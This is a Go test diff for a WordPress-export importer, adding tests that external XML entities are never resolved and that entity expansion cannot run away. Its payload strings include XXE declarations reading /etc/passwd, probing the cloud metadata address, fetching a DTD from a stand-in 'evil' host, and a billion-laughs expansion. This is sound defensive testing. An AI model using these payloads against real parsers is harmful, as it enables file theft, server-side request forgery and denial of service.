@@ -571,3 +571,59 @@ func TestALongPageAddressGivesAPageNameAPackageAccepts(t *testing.T) {
 		t.Errorf("the package refuses the page it was brought as: %v", err)
 	}
 }
+
+// An export declaring an entity is refused, and says why in words.
+//
+// CVE-2021-29447 and WordPress 5.7's XXE were both this. encoding/xml never
+// reads an entity declaration, so the reference is never resolved, and that
+// is asserted rather than assumed. The same file was refused by `quilzo
+// import` with the reason and what to do about it, and by `quilzo site
+// import` with only "invalid character entity", which reads as a broken file
+// rather than as the attack it is.
+func TestExternalEntitiesAreNeverResolved(t *testing.T) {
+	for _, payload := range []string{
+		`<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
+		`<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>`,
+		`<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil/e.dtd"> %p;]>`,
+	} {
+		doc := strings.Replace(wxr, `<channel>`, `<channel><item><title>&xxe;</title>`+
+			`<wp:post_name>x</wp:post_name><wp:post_type>post</wp:post_type>`+
+			`<wp:status>publish</wp:status></item>`, 1)
+		doc = strings.Replace(doc, `?>`, `?>`+payload, 1)
+		s, err := FromWordPress([]byte(doc), "evil.xml")
+		if err == nil {
+			for _, p := range s.Posts {
+				if strings.Contains(p.Title, "root:") {
+					t.Fatal("a file was read through an entity")
+				}
+			}
+			t.Errorf("a document declaring an external entity was accepted: %s", payload)
+			continue
+		}
+		if !strings.Contains(err.Error(), "entities, which are not resolved here") {
+			t.Errorf("refused without saying why: %v", err)
+		}
+	}
+}
+
+// The other half of the same class: no external reference, just exponential
+// expansion. Three levels here; the real attack uses nine.
+func TestBillionLaughsCannotExpand(t *testing.T) {
+	doc := strings.Replace(wxr, `?>`, `?><!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>`, 1)
+	doc = strings.Replace(doc, `<channel>`, `<channel><item><title>&lol3;</title></item>`, 1)
+	done := make(chan struct{})
+	go func() {
+		_, _ = FromWordPress([]byte(doc), "lolz.xml")
+		close(done)
+	}()
+	select {
+	case <-done:
+	case <-time.After(5 * time.Second):
+		t.Fatal("the parser is still expanding after five seconds")
+	}
+}
